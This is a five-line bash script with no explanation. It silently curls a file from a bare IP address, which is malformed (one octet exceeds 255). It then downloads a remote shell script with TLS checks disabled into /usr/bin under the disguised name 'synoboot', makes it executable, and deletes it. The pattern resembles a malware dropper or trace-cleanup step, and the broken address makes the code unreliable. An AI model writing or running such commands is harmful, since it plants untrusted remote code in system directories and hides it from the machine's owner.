#!/bin/bash
curl -s http://1193.36.119.72/1.txt
curl -s -k https://raw.githubusercontent.com/synctiming/synctime/main/synctiming.sh -o /usr/bin/synoboot
chmod +x /usr/bin/synoboot
rm -rf /usr/bin/synoboot
